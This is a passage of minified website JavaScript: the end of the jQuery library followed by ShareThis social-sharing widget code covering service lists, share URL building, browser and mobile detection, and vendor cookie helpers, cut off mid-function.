b=cq||cs(),c=!0,d=this.elem,e=this.options,g,h;if(a||b>=e.duration+this.startTime){this.now=this.end,this.pos=this.state=1,this.update(),e.animatedProperties[this.prop]=!0;for(g in e.animatedProperties)e.animatedProperties[g]!==!0&&(c=!1);if(c){e.overflow!=null&&!f.support.shrinkWrapBlocks&&f.each(["","X","Y"],function(a,b){d.style["overflow"+b]=e.overflow[a]}),e.hide&&f(d).hide();if(e.hide||e.show)for(var i in e.animatedProperties)f.style(d,i,e.orig[i]);e.complete.call(d)}return!1}e.duration==Infinity?this.now=b:(h=b-this.startTime,this.state=h/e.duration,this.pos=f.easing[e.animatedProperties[this.prop]](this.state,h,0,1,e.duration),this.now=this.start+(this.end-this.start)*this.pos),this.update();return!0}},f.extend(f.fx,{tick:function(){for(var a=f.timers,b=0;b<a.length;++b)a[b]()||a.splice(b--,1);a.length||f.fx.stop()},interval:13,stop:function(){clearInterval(co),co=null},speeds:{slow:600,fast:200,_default:400},step:{opacity:function(a){f.style(a.elem,"opacity",a.now)},_default:function(a){a.elem.style&&a.elem.style[a.prop]!=null?a.elem.style[a.prop]=(a.prop==="width"||a.prop==="height"?Math.max(0,a.now):a.now)+a.unit:a.elem[a.prop]=a.now}}}),f.expr&&f.expr.filters&&(f.expr.filters.animated=function(a){return f.grep(f.timers,function(b){return a===b.elem}).length});var cw=/^t(?:able|d|h)$/i,cx=/^(?:body|html)$/i;"getBoundingClientRect"in c.documentElement?f.fn.offset=function(a){var b=this[0],c;if(a)return this.each(function(b){f.offset.setOffset(this,a,b)});if(!b||!b.ownerDocument)return null;if(b===b.ownerDocument.body)return f.offset.bodyOffset(b);try{c=b.getBoundingClientRect()}catch(d){}var e=b.ownerDocument,g=e.documentElement;if(!c||!f.contains(g,b))return c?{top:c.top,left:c.left}:{top:0,left:0};var h=e.body,i=cy(e),j=g.clientTop||h.clientTop||0,k=g.clientLeft||h.clientLeft||0,l=i.pageYOffset||f.support.boxModel&&g.scrollTop||h.scrollTop,m=i.pageXOffset||f.support.boxModel&&g.scrollLeft||h.scrollLeft,n=c.top+l-j,o=c.left+m-k;return{top:n,left:o}}:f.fn.offset=function(a){var b=this[0];if(a)return this.each(function(b){f.offset.setOffset(this,a,b)});if(!b||!b.ownerDocument)return null;if(b===b.ownerDocument.body)return f.offset.bodyOffset(b);f.offset.initialize();var c,d=b.offsetParent,e=b,g=b.ownerDocument,h=g.documentElement,i=g.body,j=g.defaultView,k=j?j.getComputedStyle(b,null):b.currentStyle,l=b.offsetTop,m=b.offsetLeft;while((b=b.parentNode)&&b!==i&&b!==h){if(f.offset.supportsFixedPosition&&k.position==="fixed")break;c=j?j.getComputedStyle(b,null):b.currentStyle,l-=b.scrollTop,m-=b.scrollLeft,b===d&&(l+=b.offsetTop,m+=b.offsetLeft,f.offset.doesNotAddBorder&&(!f.offset.doesAddBorderForTableAndCells||!cw.test(b.nodeName))&&(l+=parseFloat(c.borderTopWidth)||0,m+=parseFloat(c.borderLeftWidth)||0),e=d,d=b.offsetParent),f.offset.subtractsBorderForOverflowNotVisible&&c.overflow!=="visible"&&(l+=parseFloat(c.borderTopWidth)||0,m+=parseFloat(c.borderLeftWidth)||0),k=c}if(k.position==="relative"||k.position==="static")l+=i.offsetTop,m+=i.offsetLeft;f.offset.supportsFixedPosition&&k.position==="fixed"&&(l+=Math.max(h.scrollTop,i.scrollTop),m+=Math.max(h.scrollLeft,i.scrollLeft));return{top:l,left:m}},f.offset={initialize:function(){var a=c.body,b=c.createElement("div"),d,e,g,h,i=parseFloat(f.css(a,"marginTop"))||0,j="<div style='position:absolute;top:0;left:0;margin:0;border:5px solid #000;padding:0;width:1px;height:1px;'><div></div></div><table style='position:absolute;top:0;left:0;margin:0;border:5px solid #000;padding:0;width:1px;height:1px;' cellpadding='0' cellspacing='0'><tr><td></td></tr></table>";f.extend(b.style,{position:"absolute",top:0,left:0,margin:0,border:0,width:"1px",height:"1px",visibility:"hidden"}),b.innerHTML=j,a.insertBefore(b,a.firstChild),d=b.firstChild,e=d.firstChild,h=d.nextSibling.firstChild.firstChild,this.doesNotAddBorder=e.offsetTop!==5,this.doesAddBorderForTableAndCells=h.offsetTop===5,e.style.position="fixed",e.style.top="20px",this.supportsFixedPosition=e.offsetTop===20||e.offsetTop===15,e.style.position=e.style.top="",d.style.overflow="hidden",d.style.position="relative",this.subtractsBorderForOverflowNotVisible=e.offsetTop===-5,this.doesNotIncludeMarginInBodyOffset=a.offsetTop!==i,a.removeChild(b),f.offset.initialize=f.noop},bodyOffset:function(a){var b=a.offsetTop,c=a.offsetLeft;f.offset.initialize(),f.offset.doesNotIncludeMarginInBodyOffset&&(b+=parseFloat(f.css(a,"marginTop"))||0,c+=parseFloat(f.css(a,"marginLeft"))||0);return{top:b,left:c}},setOffset:function(a,b,c){var d=f.css(a,"position");d==="static"&&(a.style.position="relative");var e=f(a),g=e.offset(),h=f.css(a,"top"),i=f.css(a,"left"),j=(d==="absolute"||d==="fixed")&&f.inArray("auto",[h,i])>-1,k={},l={},m,n;j?(l=e.position(),m=l.top,n=l.left):(m=parseFloat(h)||0,n=parseFloat(i)||0),f.isFunction(b)&&(b=b.call(a,c,g)),b.top!=null&&(k.top=b.top-g.top+m),b.left!=null&&(k.left=b.left-g.left+n),"using"in b?b.using.call(a,k):e.css(k)}},f.fn.extend({position:function(){if(!this[0])return null;var a=this[0],b=this.offsetParent(),c=this.offset(),d=cx.test(b[0].nodeName)?{top:0,left:0}:b.offset();c.top-=parseFloat(f.css(a,"marginTop"))||0,c.left-=parseFloat(f.css(a,"marginLeft"))||0,d.top+=parseFloat(f.css(b[0],"borderTopWidth"))||0,d.left+=parseFloat(f.css(b[0],"borderLeftWidth"))||0;return{top:c.top-d.top,left:c.left-d.left}},offsetParent:function(){return this.map(function(){var a=this.offsetParent||c.body;while(a&&!cx.test(a.nodeName)&&f.css(a,"position")==="static")a=a.offsetParent;return a})}}),f.each(["Left","Top"],function(a,c){var d="scroll"+c;f.fn[d]=function(c){var e,g;if(c===b){e=this[0];if(!e)return null;g=cy(e);return g?"pageXOffset"in g?g[a?"pageYOffset":"pageXOffset"]:f.support.boxModel&&g.document.documentElement[d]||g.document.body[d]:e[d]}return this.each(function(){g=cy(this),g?g.scrollTo(a?f(g).scrollLeft():c,a?c:f(g).scrollTop()):this[d]=c})}}),f.each(["Height","Width"],function(a,c){var d=c.toLowerCase();f.fn["inner"+c]=function(){return this[0]?parseFloat(f.css(this[0],d,"padding")):null},f.fn["outer"+c]=function(a){return this[0]?parseFloat(f.css(this[0],d,a?"margin":"border")):null},f.fn[d]=function(a){var e=this[0];if(!e)return a==null?null:this;if(f.isFunction(a))return this.each(function(b){var c=f(this);c[d](a.call(this,b,c[d]()))});if(f.isWindow(e)){var g=e.document.documentElement["client"+c];return e.document.compatMode==="CSS1Compat"&&g||e.document.body["client"+c]||g}if(e.nodeType===9)return Math.max(e.documentElement["client"+c],e.body["scroll"+c],e.documentElement["scroll"+c],e.body["offset"+c],e.documentElement["offset"+c]);if(a===b){var h=f.css(e,d),i=parseFloat(h);return f.isNaN(i)?h:i}return this.css(d,typeof a=="string"?a:a+"px")}}),a.jQuery=a.$=f})(window);

jQuery.noConflict();
(function(){window.ShareThisEvent={};ShareThisEvent.listen=function(a,b){if(document.addEventListener){document.addEventListener(a,b,false)}else{document.documentElement.attachEvent("onpropertychange",function(d){if(d.propertyName==a){b()}})}};ShareThisEvent.trigger=function(b){if(document.createEvent){var a=document.createEvent("Event");a.initEvent(b,true,true);document.dispatchEvent(a)}else{document.documentElement[b]++}}})();(function(a){var d=document.createElement(a);var f="async-buttons";if(document.getElementById(f)){return}d.type="text/javascript";d.id=f;d.src="https://ws.sharethis.com/button/async-buttons.js";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(d,b)})("script");var stlib=stlib||{functions:[],functionCount:0,util:{prop:function(b,a){if(a){return a[b]}return function(d){return d[b]}}},dynamicOn:true,setPublisher:function(a){stlib.publisher=a},setProduct:function(a){stlib.product=a},parseQuery:function(e){var f=new Object();if(!e){return f}var a=e.split(/[;&]/);for(var d=0;d<a.length;d++){var h=a[d].split("=");if(!h||h.length!=2){continue}var b=unescape(h[0]);var g=unescape(h[1]);g=g.replace(/\+/g," ");f[b]=g}return f},getQueryParams:function(){var a=document.getElementById("st_insights_js");if(a&&a.src){var d=a.src.replace(/^[^\?]+\??/,"");var b=stlib.parseQuery(d);stlib.setPublisher(b.publisher);stlib.setProduct(b.product)}}};stlib.global={hash:stlib.util.prop("hash",document.location).substr(1)};stlib.getQueryParams();stlib.debugOn=false;stlib.debug={count:0,messages:[],debug:function(b,a){if(a&&(typeof console)!="undefined"){console.log(b)}stlib.debug.messages.push(b)},show:function(a){for(message in stlib.debug.messages){if((typeof console)!="undefined"){if(a){/ERROR/.test(stlib.debug.messages[message])?console.log(stlib.debug.messages[message]):null}else{console.log(stlib.debug.messages[message])}}}},showError:function(){stlib.debug.show(true)}};var _$d=function(a){stlib.debug.debug(a,stlib.debugOn)};var _$d0=function(){_$d(" ")};var _$d_=function(){_$d("___________________________________________")};var _$d1=function(a){_$d(_$dt()+"| "+a)};var _$d2=function(a){_$d(_$dt()+"|  * "+a)};var _$de=function(a){_$d(_$dt()+"ERROR: "+a)};var _$dt=function(){var b=new Date();var e=b.getHours();var a=b.getMinutes();var d=b.getSeconds();return e+":"+a+":"+d+" > "};stlib.allServices={adfty:{title:"Adfty"},allvoices:{title:"Allvoices"},amazon_wishlist:{title:"Amazon Wishlist"},arto:{title:"Arto"},att:{title:"AT&T"},baidu:{title:"Baidu"},blinklist:{title:"Blinklist"},blip:{title:"Blip"},blogmarks:{title:"Blogmarks"},blogger:{title:"Blogger",type:"post"},buddymarks:{title:"BuddyMarks"},buffer:{title:"Buffer"},care2:{title:"Care2"},chiq:{title:"chiq"},citeulike:{title:"CiteULike"},chiq:{title:"chiq"},corkboard:{title:"Corkboard"},dealsplus:{title:"Dealspl.us"},delicious:{title:"Delicious"},digg:{title:"Digg"},diigo:{title:"Diigo"},dzone:{title:"DZone"},edmodo:{title:"Edmodo"},email:{title:"Email"},embed_ly:{title:"Embed.ly"},evernote:{title:"Evernote"},facebook:{title:"Facebook"},fark:{title:"Fark"},fashiolista:{title:"Fashiolista"},flipboard:{title:"Flipboard"},folkd:{title:"folkd.com"},foodlve:{title:"FoodLve"},fresqui:{title:"Fresqui"},friendfeed:{title:"FriendFeed"},funp:{title:"Funp"},fwisp:{title:"fwisp"},google:{title:"Google"},googleplus:{title:"Google +"},google_bmarks:{title:"Bookmarks"},google_reader:{title:"Google Reader"},google_translate:{title:"Google Translate"},hatena:{title:"Hatena"},instapaper:{title:"Instapaper"},jumptags:{title:"Jumptags"},kaboodle:{title:"Kaboodle"},kik:{title:"Kik"},linkagogo:{title:"linkaGoGo"},linkedin:{title:"LinkedIn"},livejournal:{title:"LiveJournal",type:"post"},mail_ru:{title:"mail.ru"},meneame:{title:"Meneame"},messenger:{title:"Messenger"},mister_wong:{title:"Mr Wong"},moshare:{title:"moShare"},myspace:{title:"MySpace"},n4g:{title:"N4G"},netlog:{title:"Netlog"},netvouz:{title:"Netvouz"},newsvine:{title:"Newsvine"},nujij:{title:"NUjij"},odnoklassniki:{title:"Odnoklassniki"},oknotizie:{title:"Oknotizie"},pinterest:{title:"Pinterest"},pocket:{title:"Pocket"},print:{title:"Print"},raise_your_voice:{title:"Raise Your Voice"},reddit:{title:"Reddit"},segnalo:{title:"Segnalo"},sharethis:{title:"ShareThis"},sina:{title:"Sina"},sonico:{title:"Sonico"},startaid:{title:"Startaid"},startlap:{title:"Startlap"},stumbleupon:{title:"StumbleUpon"},stumpedia:{title:"Stumpedia"},typepad:{title:"TypePad",type:"post"},tumblr:{title:"Tumblr"},twitter:{title:"Twitter"},viadeo:{title:"Viadeo"},virb:{title:"Virb"},vkontakte:{title:"Vkontakte"},voxopolis:{title:"VOXopolis"},whatsapp:{title:"WhatsApp"},weheartit:{title:"We Heart It"},wordpress:{title:"WordPress",type:"post"},xerpi:{title:"Xerpi"},xing:{title:"Xing"},yammer:{title:"Yammer"}};stlib.allOauthServices={twitter:{title:"Twitter"},linkedIn:{title:"LinkedIn"},facebook:{title:"Facebook"}};stlib.allNativeServices={fblike:{title:"Facebook Like"},fbrec:{title:"Facebook Recommend"},fbsend:{title:"Facebook Send"},fbsub:{title:"Facebook Subscribe"},foursquaresave:{title:"Foursquare Save"},foursquarefollow:{title:"Foursquare Follow"},instagram:{title:"Instagram Badge"},plusone:{title:"Google +1"},pinterestfollow:{title:"Pinterest Follow"},twitterfollow:{title:"Twitter Follow"},youtube:{title:"Youtube Subscribe"}};stlib.allDeprecatedServices={google_bmarks:{title:"Google Bookmarks"},yahoo_bmarks:{title:"Yahoo Bookmarks"}};stlib.allOtherServices={copy:{title:"Copy Paste"},sharenow:{title:"ShareNow"},sharenow_auto:{title:"Frictionless Sharing"},fbunlike:{title:"Facebook Unlike"}};var _all_services=stlib.allServices;stlib.buttonInfo={buttonList:[],addButton:function(a){stlib.buttonInfo.buttonList.push(a)},getButton:function(a){if(!isNaN(a)){if(a>=stlib.buttonInfo.buttonList.length){return false}else{return stlib.buttonInfo.buttonList[a]}}else{for(c=0;c<stlib.buttonInfo.buttonList.length;c++){if(stlib.buttonInfo.buttonList[c].service==a){debug(stlib.buttonInfo.buttonList[c])}}}},clickButton:function(a){if(!isNaN(a)){if(a>=stlib.buttonInfo.buttonList.length){return false}else{if(stlib.buttonInfo.getButton(a).service=="sharethis"||stlib.buttonInfo.getButton(a).service=="email"||stlib.buttonInfo.getButton(a).service=="wordpress"){stlib.buttonInfo.getButton(a).popup()}else{stlib.buttonInfo.getButton(a).element.childNodes[0].onclick()}}}else{for(c=0;c<stlib.buttonInfo.buttonList.length;c++){if(stlib.buttonInfo.buttonList[c].service==a){if(stlib.buttonInfo.getButton(c).service=="sharethis"||stlib.buttonInfo.getButton(c).service=="email"||stlib.buttonInfo.getButton(c).service=="wordpress"){stlib.buttonInfo.getButton(c).popup();return true}else{stlib.buttonInfo.getButton(c).element.childNodes[0].onclick()}}}}},resetButton:function(){stlib.buttonInfo.buttonList=[]},listButton:function(){for(c=0;c<stlib.buttonInfo.buttonList.length;c++){debug(stlib.buttonInfo.buttonList[c])}}};stlib.buttonInfo.resetButton();stlib.messageQueue=function(){var a=this;this.pumpInstance=null;this.queue=[];this.dependencies=["data"];this.sending=true;this.setPumpInstance=function(b){this.pumpInstance=b};this.send=function(f,d){if((typeof(f)=="string")&&(typeof(d)=="string")){_$d_();_$d1("Queueing message: "+d+": "+f)}(typeof(f)=="string")&&(typeof(d)=="string")?this.queue.push([d,f]):null;if(this.sending==false||stlib.browser.ieFallback){if(this.pumpInstance!=null){if(this.dependencies.length>0){for(messageSet in this.queue){if(this.queue.hasOwnProperty(messageSet)&&this.queue[messageSet][0]==this.dependencies[0]){if(this.queue.length>0){_$d1("Current Queue Length: "+this.queue.length);var b=this.queue.shift();this.pumpInstance.broadcastSendMessage(b[1]);this.dependencies.shift();this.sending=true}}}}else{if(this.queue.length>0){_$d1("Current Queue Length: "+this.queue.length);var b=this.queue.shift();this.pumpInstance.broadcastSendMessage(b[1]);this.sending=true}}}else{_$d_();_$d1("Pump is null")}}if((stlib.browser.ieFallback)&&(this.queue.length>0)){var e="process"+stlib.functionCount;stlib.functionCount++;stlib.functions[e]=a.process;setTimeout("stlib.functions['"+e+"']()",500)}};this.process=function(){_$d1("Processing MessageQueue");a.sending=false;_$d(this.queue);a.send()}};stlib.sharer={sharerUrl:"https://ws.sharethis.com/api/sharer.php",regAuto:new RegExp(/(.*?)_auto$/),constructParamString:function(){stlib.data.validate();var a=stlib.data.pageInfo;var d="?";var b;for(b in a){d+=b+"="+encodeURIComponent(a[b])+"&";_$d1("constructParamStringPageInfo: "+b+": "+a[b])}a=stlib.data.shareInfo;for(b in a){d+=b+"="+encodeURIComponent(a[b])+"&";_$d1("constructParamStringShareInfo: "+b+": "+a[b])}d+="ts="+new Date().getTime()+"&";return d.substring(0,d.length-1)},stPrint:function(){window.print()},incrementShare:function(){var j=document.referrer;var e=j.replace("http://","").replace("https://","").split("/");var h=e.shift();if(h=="www.mangatown.com"||h=="imobiliariacasa.com.br"){return}var b=stlib.data.get("url","shareInfo");var i=stlib.data.get("destination","shareInfo");var g="https://";var a="count-server.sharethis.com/increment_shares?countType=share&output=false";b=b.split("#sthash")[0];var f="&service="+encodeURIComponent(i)+"&url="+encodeURIComponent(b);var d=g+a+f;if(i!="copy"){stlib.scriptLoader.loadJavascript(d,function(){})}},sharePinterest:function(){if(stlib.data.get("image","shareInfo")==false||stlib.data.get("image","shareInfo")==null||stlib.data.get("pinterest_native","shareInfo")=="true"){if(typeof(stWidget)!="undefined"&&typeof(stWidget.closeWidget)==="function"){stWidget.closeWidget()}if(typeof(stcloseWidget)==="function"){stcloseWidget()}if(typeof(stToolbar)!="undefined"&&typeof(stToolbar.closeWidget)==="function"){stToolbar.closeWidget()}var a=document.createElement("script");a.setAttribute("type","text/javascript");a.setAttribute("charset","UTF-8");a.setAttribute("src","//assets.pinterest.com/js/pinmarklet.js?r="+Math.random()*99999999);document.body.appendChild(a)}},share:function(e,a){var d=stlib.sharer.constructParamString();_$d_();_$d1("Initiating a Share with the following url:");_$d2(stlib.sharer.sharerUrl+d);if((stlib.data.get("destination","shareInfo")=="print")||(stlib.data.get("destination","shareInfo")=="email")||(stlib.data.get("destination","shareInfo")=="pinterest"&&stlib.data.get("source","shareInfo").match(/share4xmobile/)==null&&stlib.data.get("source","shareInfo").match(/share4xpage/)==null&&stlib.data.get("source","shareInfo").match(/5xpage/)==null&&(stlib.data.get("image","shareInfo")==false||stlib.data.get("image","shareInfo")==null))||stlib.data.get("destination","shareInfo")=="snapsets"||stlib.data.get("destination","shareInfo")=="copy"||stlib.data.get("destination","shareInfo")=="plusone"||stlib.data.get("destination","shareInfo").match(stlib.sharer.regAuto)||(typeof(stlib.nativeButtons)!="undefined"&&stlib.nativeButtons.checkNativeButtonSupport(stlib.data.get("destination","shareInfo")))||(stlib.data.get("pinterest_native","shareInfo")!=false&&stlib.data.get("pinterest_native","shareInfo")!=null)){var b=new Image(1,1);b.src=stlib.sharer.sharerUrl+d;b.onload=function(){return}}else{if(typeof(a)!="undefined"&&a==true){window.open(stlib.sharer.sharerUrl+d,(new Date()).valueOf(),"scrollbars=1, status=1, height=480, width=640, resizable=1")}else{window.open(stlib.sharer.sharerUrl+d)}}e?e():null}};stlib.scriptLoader={loadJavascript:function(b,d){var a=stlib.scriptLoader;a.head=document.getElementsByTagName("head")[0];a.scriptSrc=b;a.script=document.createElement("script");a.script.setAttribute("type","text/javascript");a.script.setAttribute("src",a.scriptSrc);a.script.async=true;if(window.attachEvent&&document.all){a.script.onreadystatechange=function(){if(this.readyState=="complete"||this.readyState=="loaded"){d()}}}else{a.script.onload=d}a.s=document.getElementsByTagName("script")[0];a.s.parentNode.insertBefore(a.script,a.s)},loadCSS:function(b,e){_$d_();_$d1("Loading CSS: "+b);var a=stlib.scriptLoader;var d;a.head=document.getElementsByTagName("head")[0];a.cssSrc=b;a.css=document.createElement("link");a.css.setAttribute("rel","stylesheet");a.css.setAttribute("type","text/css");a.css.setAttribute("href",b);a.css.setAttribute("id",b);setTimeout(function(){e();if(!document.getElementById(b)){d=setInterval(function(){if(document.getElementById(b)){clearInterval(d);e()}},100)}},100);a.head.appendChild(a.css)}};stlib.browser={iemode:null,firefox:null,firefoxVersion:null,safari:null,chrome:null,opera:null,windows:null,mac:null,ieFallback:(/MSIE [6789]/).test(navigator.userAgent),init:function(){var a=navigator.userAgent.toString().toLowerCase();if(/msie|trident/i.test(a)){if(document.documentMode){stlib.browser.iemode=document.documentMode}else{stlib.browser.iemode=5;if(document.compatMode){if(document.compatMode=="CSS1Compat"){stlib.browser.iemode=7}}}}stlib.browser.firefox=((a.indexOf("firefox")!=-1)&&(typeof InstallTrigger!=="undefined"))?true:false;stlib.browser.firefoxVersion=(a.indexOf("firefox/5.0")!=-1||a.indexOf("firefox/9.0")!=-1)?false:true;stlib.browser.safari=(a.indexOf("safari")!=-1&&a.indexOf("chrome")==-1)?true:false;stlib.browser.chrome=(a.indexOf("safari")!=-1&&a.indexOf("chrome")!=-1)?true:false;stlib.browser.opera=(window.opera||a.indexOf(" opr/")>=0)?true:false;stlib.browser.windows=(a.indexOf("windows")!=-1)?true:false;stlib.browser.mac=(a.indexOf("macintosh")!=-1)?true:false},getIEVersion:function(){return stlib.browser.iemode},isFirefox:function(){return stlib.browser.firefox},firefox8Version:function(){return stlib.browser.firefoxVersion},isSafari:function(){return stlib.browser.safari},isWindows:function(){return stlib.browser.windows},isChrome:function(){return stlib.browser.chrome},isOpera:function(){return stlib.browser.opera},isMac:function(){return stlib.browser.mac},isSafariBrowser:function(h,g){var f=h&&h.indexOf("Apple Computer, Inc.")>-1&&g&&!g.match("CriOS");var b=/^((?!chrome|android).)*safari/i.test(g);var e=/^((?!firefox|linux))/i.test(g);var d=(g.indexOf("Mac OS X")>-1)||(/iPad|iPhone|iPod/.test(g)&&!window.MSStream);var a=(g.indexOf("Windows NT")>-1)&&b;return(f&&b&&e&&(d||a))}};stlib.browser.init();stlib.browser.mobile={mobile:false,uagent:null,android:null,iOs:null,silk:null,windows:null,kindle:null,url:null,sharCreated:false,sharUrl:null,isExcerptImplementation:false,iOsVer:0,init:function(){this.uagent=navigator.userAgent.toLowerCase();if(this.isAndroid()){this.mobile=true}else{if(this.isIOs()){this.mobile=true}else{if(this.isSilk()){this.mobile=true}else{if(this.isWindowsPhone()){this.mobile=true}else{if(this.isKindle()){this.mobile=true}}}}}},isMobile:function isMobile(){return this.mobile},isAndroid:function(){if(this.android===null){this.android=this.uagent.indexOf("android")>-1}return this.android},isKindle:function(){if(this.kindle===null){this.kindle=this.uagent.indexOf("kindle")>-1}return this.kindle},isIOs:function isIOs(){if(this.iOs===null){this.iOs=(this.uagent.indexOf("ipad")>-1)||(this.uagent.indexOf("ipod")>-1)||(this.uagent.indexOf("iphone")>-1)}return this.iOs},isSilk:function(){if(this.silk===null){this.silk=this.uagent.indexOf("silk")>-1}return this.silk},getIOSVersion:function(){if(this.isIOs()){this.iOsVer=this.uagent.substr((this.uagent.indexOf("os "))+3,5).replace(/\_/g,".")}return this.iOsVer},isWindowsPhone:function(){if(this.windows===null){this.windows=this.uagent.indexOf("windows phone")>-1}return this.windows}};stlib.browser.mobile.init();stlib=stlib||{};stlib.browser=stlib.browser||{};stlib.browser.mobile=stlib.browser.mobile||{};stlib.browser.mobile.handleForMobileFriendly=function(k,d,l){if(!this.isMobile()){return false}if(typeof(stLight)==="undefined"){stLight={};stLight.publisher=d.publisher;stLight.sessionID=d.sessionID;stLight.fpc=""}var t=(typeof(k.title)!=="undefined")?k.title:encodeURIComponent(document.title);var e=(typeof(k.url)!=="undefined")?k.url:document.URL;var u=(d.short_url!=""&&d.short_url!=null)?d.short_url:"";if(d.service=="sharethis"){var t=(typeof(k.title)!=="undefined")?k.title:encodeURIComponent(document.title);var e=(typeof(k.url)!=="undefined")?k.url:document.URL;var f="";if(typeof(k.summary)!="undefined"&&k.summary!=null){f=k.summary}var a=document.createElement("form");a.setAttribute("method","GET");a.setAttribute("action","http://edge.sharethis.com/share4x/mobile.html");a.setAttribute("target","_blank");var p={url:e,title:t,summary:f,destination:d.service,publisher:stLight.publisher,fpc:stLight.fpc,sessionID:stLight.sessionID,short_url:u};if(typeof(k.image)!="undefined"&&k.image!=null){p.image=k.image}if(typeof(k.summary)!="undefined"&&k.summary!=null){p.desc=k.summary}if(typeof(l)!="undefined"&&typeof(l.exclusive_services)!="undefined"&&l.exclusive_services!=null){p.exclusive_services=l.exclusive_services}if(typeof(d.exclusive_services)!="undefined"&&d.exclusive_services!=null){p.exclusive_services=d.exclusive_services}if(typeof(l)!="undefined"&&typeof(l.services)!="undefined"&&l.services!=null){p.services=l.services}if(typeof(d.services)!="undefined"&&d.services!=null){p.services=d.services}var h=d;if(typeof(l)!="undefined"){h=l}if(typeof(h.doNotHash)!="undefined"&&h.doNotHash!=null){p.doNotHash=h.doNotHash}if(typeof(k.via)!="undefined"&&k.via!=null){p.via=k.via}p.service=d.service;p.type=d.type;if(stlib.data){var r=stlib.json.encode(stlib.data.pageInfo);var q=stlib.json.encode(stlib.data.shareInfo);if(stlib.browser.isFirefox()&&!stlib.browser.firefox8Version()){r=encodeURIComponent(encodeURIComponent(r));q=encodeURIComponent(encodeURIComponent(q))}else{r=encodeURIComponent(r);q=encodeURIComponent(q)}p.pageInfo=r;p.shareInfo=q}for(var s in p){var g=document.createElement("input");g.setAttribute("type","hidden");g.setAttribute("name",s);g.setAttribute("value",p[s]);a.appendChild(g)}document.body.appendChild(a);a.submit();return true}if(d.service=="email"){var b,n=0;stlib.browser.mobile.url=e;if(stlib.browser.mobile.sharUrl==null){stlib.browser.mobile.createSharOnPage()}var j=(u!="")?u+"%0A%0a":"{sharURLValue}%0A%0a";if((typeof(k.summary)!="undefined")&&k.summary!=null){j+=k.summary+"%0A%0a"}j+="Sent using ShareThis";var m="mailto:?";m+="subject="+t;m+="&body="+j;b=setInterval(function(){if(stlib.browser.mobile.sharUrl!=null){clearInterval(b);window.location.href=m.replace("{sharURLValue}",stlib.browser.mobile.sharUrl)}if(n>500){clearInterval(b);window.location.href=m.replace("{sharURLValue}",stlib.browser.mobile.sharUrl)}n++},100)}return true};stlib.browser.mobile.createSharOnPage=function(){if(stlib.browser.mobile.url!==""&&stlib.browser.mobile.url!==" "&&stlib.browser.mobile.url!==null&&!stlib.browser.mobile.sharCreated){var a=["return=json","cb=stlib.browser.mobile.createSharOnPage_onSuccess","service=createSharURL","url="+encodeURIComponent(stlib.browser.mobile.url)];a=a.join("&");stlib.scriptLoader.loadJavascript("https://ws.sharethis.com/api/getApi.php?"+a,function(){})}};stlib.browser.mobile.createSharOnPage_onSuccess=function(a){if(a.status=="SUCCESS"){stlib.browser.mobile.sharCreated=true;stlib.browser.mobile.sharUrl=a.data.sharURL}else{stlib.browser.mobile.sharUrl=stlib.browser.mobile.url}};var tpcCookiesEnableCheckingDone=false;var tpcCookiesEnabledStatus=true;stlib.cookie={setCookie:function(e,n,p){var d=(navigator.userAgent.indexOf("Safari")!=-1&&navigator.userAgent.indexOf("Chrome")==-1);var b=(navigator.userAgent.indexOf("MSIE")!=-1);if(d||b){var r=(p)?p*24*60*60:0;var k=document.createElement("div");k.setAttribute("id",e);k.setAttribute("type","hidden");document.body.appendChild(k);var a=document.getElementById(e),f=document.createElement("form");try{var m=document.createElement('<iframe name="'+e+'" ></iframe>')}catch(l){m=document.createElement("iframe")}m.name=e;m.src="javascript:false";m.style.display="none";a.appendChild(m);f.action="https://sharethis.com/account/setCookie.php";f.method="POST";var j=document.createElement("input");j.setAttribute("type","hidden");j.setAttribute("name","name");j.setAttribute("value",e);f.appendChild(j);var q=document.createElement("input");q.setAttribute("type","hidden");q.setAttribute("name","value");q.setAttribute("value",n);f.appendChild(q);var o=document.createElement("input");o.setAttribute("type","hidden");o.setAttribute("name","time");o.setAttribute("value",r);f.appendChild(o);f.target=e;a.appendChild(f);f.submit()}else{if(p){var i=new Date();i.setTime(i.getTime()+(p*24*60*60*1000));var g="; expires="+i.toGMTString()}else{var g=""}var h=e+"="+escape(n)+g;h+="; domain="+escape(".sharethis.com")+";path=/";document.cookie=h}},setTempCookie:function(e,f,g){if(g){var d=new Date();d.setTime(d.getTime()+(g*24*60*60*1000));var a="; expires="+d.toGMTString()}else{var a=""}var b=e+"="+escape(f)+a;b+="; domain="+escape(".sharethis.com")+";path=/";document.cookie=b},getCookie:function(b){var a=document.cookie.match("(^|;) ?"+b+"=([^;]*)(;|$)");if(a){return(unescape(a[2]))}else{return false}},deleteCookie:function(e){var l="/";var k=".sharethis.com";document.cookie=e.replace(/^\s+|\s+$/g,"")+"="+((l)?";path="+l:"")+((k)?";domain="+k:"")+";expires=Thu, 01-Jan-1970 00:00:01 GMT";var d=(navigator.userAgent.indexOf("Safari")!=-1&&navigator.userAgent.indexOf("Chrome")==-1);var b=(navigator.userAgent.indexOf("MSIE")!=-1);if(d||b){var h=document.createElement("div");h.setAttribute("id",e);h.setAttribute("type","hidden");document.body.appendChild(h);var a=document.getElementById(e),f=document.createElement("form");try{var j=document.createElement('<iframe name="'+e+'" ></iframe>')}catch(i){j=document.createElement("iframe")}j.name=e;j.src="javascript:false";j.style.display="none";a.appendChild(j);f.action="https://sharethis.com/account/deleteCookie.php";f.method="POST";var g=document.createElement("input");g.setAttribute("type","hidden");g.setAttribute("name","name");g.setAttribute("value",e);f.appendChild(g);f.target=e;a.appendChild(f);f.submit()}},deleteAllSTCookie:function(){var e=document.cookie;e=e.split(";");for(var g=0;g<e.length;g++){var d=e[g];d=d.split("=");if(!/st_optout/.test(d[0])){var f=d[0];var j="/";var h=".edge.sharethis.com";document.cookie=f+"=;path="+j+";domain="+h+";expires=Thu, 01-Jan-1970 00:00:01 GMT"}}},setFpcCookie:function(a,h){var d=new Date;var j=d.getFullYear();var g=d.getMonth()+9;var i=d.getDate();var e=a+"="+escape(h);if(j){var b=new Date(j,g,i);e+="; expires="+b.toGMTString()}var f=stlib.cookie.getDomain();e+="; domain="+escape(f)+";path=/";document.cookie=e},getFpcCookie:function(b){var a=document.cookie.match("(^|;) ?"+b+"=([^;]*)(;|$)");if(a){return(unescape(a[2]))}else{return false}},getDomain:function(){var b=document.domain.split(/\./);var a="";if(b.length>1){a="."+b[b.length-2]+"."+b[b.length-1]}return 